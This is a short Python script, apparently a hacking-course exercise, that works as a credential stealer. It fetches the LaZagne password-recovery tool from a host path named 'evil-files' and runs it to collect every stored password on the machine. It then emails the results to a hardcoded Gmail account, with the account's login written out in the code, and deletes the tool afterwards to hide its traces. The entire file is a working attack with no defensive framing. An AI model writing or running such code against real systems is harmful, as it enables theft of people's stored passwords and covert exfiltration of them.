#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.168.1.77/evil-files/laZagne.py")
result = subprocess.check_output("laZagne.py all", shell=True)
send_email("johnwickend29@gmail.com", "123abc1234abc", result)
os.remove("laZagne.py")